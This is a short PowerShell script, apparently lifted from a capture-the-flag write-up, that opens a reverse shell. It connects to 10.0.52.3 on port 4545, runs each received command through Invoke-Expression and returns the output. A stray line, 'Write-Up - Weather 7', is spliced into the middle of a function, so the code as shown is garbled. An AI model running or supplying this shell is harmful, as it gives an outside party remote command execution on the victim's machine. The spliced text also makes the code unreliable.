```powershell
$TCPClient = New-Object Net.Sockets.TCPClient('10.0.52.3', 4545);
$stream = $TCPClient.GetStream();
$writer = New-Object IO.StreamWriter($stream);
function cmd($cmd) {
try {
return Invoke-Expression $cmd 2>&1 | Out-String;
} catch {
return $_ | Out-String;
}
}
function sendOutput($data) {
Write-Up - Weather 7
[byte[]] $script:buffer = 0..$TCPClient.ReceiveBufferSize | % {0};
$writer.Write($data);
$writer.Flush();
}
sendOutput('');
while(($bytes = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
$data = ([text.encoding]::UTF8).GetString($buffer, 0, $bytes - 1);
sendOutput(cmd($data) + "`n");
}
$writer.Close()
```